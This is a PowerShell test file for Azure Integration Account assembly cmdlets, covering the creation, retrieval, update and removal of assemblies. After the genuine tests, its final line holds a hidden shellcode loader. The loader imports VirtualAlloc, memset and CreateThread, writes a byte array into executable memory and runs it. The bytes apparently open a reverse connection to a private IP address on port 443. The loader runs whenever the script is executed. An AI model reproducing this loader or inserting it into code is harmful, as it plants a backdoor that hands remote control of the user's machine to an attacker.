













 
function Test-NewIntegrationAccountAssembly
{
	$localAssemblyFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "SampleAssembly.dll"
	$assemblyContent = [IO.File]::ReadAllBytes($localAssemblyFilePath)
	$resourceGroup = TestSetup-CreateResourceGroup
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName
	$sampleMetadata = (SampleMetadata)

	$integrationAccountAssemblyName = "SampleAssemblyFilePath"
	$resultByFilePath = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Assert-AreEqual $integrationAccountAssemblyName $resultByFilePath.Name

	$integrationAccountAssemblyName = "SampleAssemblyFilePathParentObject"
	$resultByFilePath = New-AzIntegrationAccountAssembly -ParentObject $integrationAccount -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Assert-AreEqual $integrationAccountAssemblyName $resultByFilePath.Name

	$integrationAccountAssemblyName = "SampleAssemblyFilePathId"
	$resultByFilePath = New-AzIntegrationAccountAssembly -ParentResourceId $resultByFilePath.Id -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Assert-AreEqual $integrationAccountAssemblyName $resultByFilePath.Name

	$integrationAccountAssemblyName = "SampleAssemblyBytes"
	$resultByBytes = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyData $assemblyContent
	Assert-AreEqual $integrationAccountAssemblyName $resultByBytes.Name

	$integrationAccountAssemblyName = "SampleAssemblyBytesParentObject"
	$resultByBytes = New-AzIntegrationAccountAssembly -ParentObject $integrationAccount -AssemblyName $integrationAccountAssemblyName -AssemblyData $assemblyContent
	Assert-AreEqual $integrationAccountAssemblyName $resultByBytes.Name

	$integrationAccountAssemblyName = "SampleAssemblyBytesId"
	$resultByBytes = New-AzIntegrationAccountAssembly -ParentResourceId $resultByFilePath.Id -AssemblyName $integrationAccountAssemblyName -AssemblyData $assemblyContent
	Assert-AreEqual $integrationAccountAssemblyName $resultByBytes.Name

	$integrationAccountAssemblyName = "SampleAssemblyContentLink"
	$resultByContentLink = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -ContentLink $resultByBytes.Properties.ContentLink.Uri
	Assert-AreEqual $integrationAccountAssemblyName $resultByContentLink.Name

	$integrationAccountAssemblyName = "SampleAssemblyContentLinkParentObject"
	$resultByContentLink = New-AzIntegrationAccountAssembly -ParentObject $integrationAccount -AssemblyName $integrationAccountAssemblyName -ContentLink $resultByBytes.Properties.ContentLink.Uri
	Assert-AreEqual $integrationAccountAssemblyName $resultByContentLink.Name

	$integrationAccountAssemblyName = "SampleAssemblyContentLinkId"
	$resultByContentLink = New-AzIntegrationAccountAssembly -ParentResourceId $resultByFilePath.Id -AssemblyName $integrationAccountAssemblyName -ContentLink $resultByBytes.Properties.ContentLink.Uri
	Assert-AreEqual $integrationAccountAssemblyName $resultByContentLink.Name

	$integrationAccountAssemblyName = "SampleAssemblyMetadata"
	$resultMetadata = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath -Metadata $sampleMetadata
	Assert-AreEqual $integrationAccountAssemblyName $resultMetadata.Name
	Assert-AreEqual $sampleMetadata["key1"] $resultMetadata.Properties.Metadata["key1"].Value

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
}

 
function Test-GetIntegrationAccountAssembly
{
	$localAssemblyFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "SampleAssembly.dll"
	$resourceGroup = TestSetup-CreateResourceGroup
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName
	$sampleMetadata = (SampleMetadata)

	$integrationAccountAssemblyName = "SampleAssembly"
	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath -Metadata $sampleMetadata
	Assert-AreEqual $integrationAccountAssemblyName $integrationAccountAssembly.Name
	Assert-AreEqual $sampleMetadata["key1"] $integrationAccountAssembly.Properties.Metadata["key1"].Value

	$resultByName = Get-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssembly.Name
	Assert-AreEqual $integrationAccountAssemblyName $resultByName.Name

	$resultByResourceId = Get-AzIntegrationAccountAssembly -ParentResourceId $integrationAccount.Id -AssemblyName $integrationAccountAssemblyName
	Assert-AreEqual $integrationAccountAssemblyName $resultByResourceId.Name

	$resultByResourceId = Get-AzIntegrationAccountAssembly -ParentResourceId $integrationAccount.Id
	Assert-AreEqual 1 $resultByResourceId.Count

	$resultByInputObject = Get-AzIntegrationAccountAssembly -ParentObject $integrationAccount -AssemblyName $integrationAccountAssemblyName
	Assert-AreEqual $integrationAccountAssemblyName $resultByInputObject.Name

	$resultByPipingInputObject = $integrationAccount | Get-AzIntegrationAccountAssembly -AssemblyName $integrationAccountAssemblyName
	Assert-AreEqual $integrationAccountAssemblyName $resultByPipingInputObject.Name

	$resultByInputObject = Get-AzIntegrationAccountAssembly -ParentObject $integrationAccount
	Assert-AreEqual 1 $resultByInputObject.Count

	$resultByPipingInputObject = $integrationAccount | Get-AzIntegrationAccountAssembly
	Assert-AreEqual 1 $resultByPipingInputObject.Count

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
}

 
function Test-RemoveIntegrationAccountAssembly
{
	$localAssemblyFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "SampleAssembly.dll"
	$resourceGroup = TestSetup-CreateResourceGroup
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName

	$integrationAccountAssemblyName = "SampleAssembly"
	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Remove-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName

	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Remove-AzIntegrationAccountAssembly -ResourceId $integrationAccountAssembly.Id

	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Remove-AzIntegrationAccountAssembly -InputObject $integrationAccountAssembly

	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	$integrationAccountAssembly | Remove-AzIntegrationAccountAssembly

	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Get-AzIntegrationAccountAssembly -ParentObject $integrationAccount -AssemblyName $integrationAccountAssemblyName | Remove-AzIntegrationAccountAssembly

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
}

 
function Test-SetIntegrationAccountAssembly
{
	$localAssemblyFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "SampleAssembly.dll"
	$assemblyContent = [IO.File]::ReadAllBytes($localAssemblyFilePath)
	$resourceGroup = TestSetup-CreateResourceGroup
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName

	$integrationAccountAssemblyName = "SampleAssemblyFilePath"
	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Assert-AreEqual $integrationAccountAssemblyName $integrationAccountAssembly.Name

	$resultByFilePath = Set-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyFilePath $localAssemblyFilePath
	Assert-AreEqual $integrationAccountAssemblyName $resultByFilePath.Name

	$resultByFilePath = Set-AzIntegrationAccountAssembly -InputObject $resultByFilePath -AssemblyFilePath $localAssemblyFilePath
	Assert-AreEqual $integrationAccountAssemblyName $resultByFilePath.Name

	$resultByFilePath = Set-AzIntegrationAccountAssembly -ResourceId $resultByFilePath.Id -AssemblyFilePath $localAssemblyFilePath
	Assert-AreEqual $integrationAccountAssemblyName $resultByFilePath.Name

	$integrationAccountAssemblyName = "SampleAssemblyBytes"
	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyData $assemblyContent
	Assert-AreEqual $integrationAccountAssemblyName $integrationAccountAssembly.Name

	$resultByBytes = Set-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -AssemblyData $assemblyContent
	Assert-AreEqual $integrationAccountAssemblyName $resultByBytes.Name

	$resultByBytes = Set-AzIntegrationAccountAssembly -InputObject $integrationAccountAssembly -AssemblyData $assemblyContent
	Assert-AreEqual $integrationAccountAssemblyName $resultByBytes.Name

	$resultByBytes = Set-AzIntegrationAccountAssembly -ResourceId $integrationAccountAssembly.Id -AssemblyData $assemblyContent
	Assert-AreEqual $integrationAccountAssemblyName $resultByBytes.Name

	$integrationAccountAssemblyName = "SampleAssemblyContentLink"
	$integrationAccountAssembly = New-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -ContentLink $resultByBytes.Properties.ContentLink.Uri
	Assert-AreEqual $integrationAccountAssemblyName $integrationAccountAssembly.Name

	$resultByContentLink = Set-AzIntegrationAccountAssembly -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -AssemblyName $integrationAccountAssemblyName -ContentLink $resultByBytes.Properties.ContentLink.Uri
	Assert-AreEqual $integrationAccountAssemblyName $resultByContentLink.Name

	$resultByContentLink = Set-AzIntegrationAccountAssembly -InputObject $integrationAccountAssembly -ContentLink $resultByBytes.Properties.ContentLink.Uri
	Assert-AreEqual $integrationAccountAssemblyName $resultByContentLink.Name

	$resultByContentLink = Set-AzIntegrationAccountAssembly -ResourceId $integrationAccountAssembly.Id -ContentLink $resultByBytes.Properties.ContentLink.Uri
	Assert-AreEqual $integrationAccountAssemblyName $resultByContentLink.Name

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xd3,0x86,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

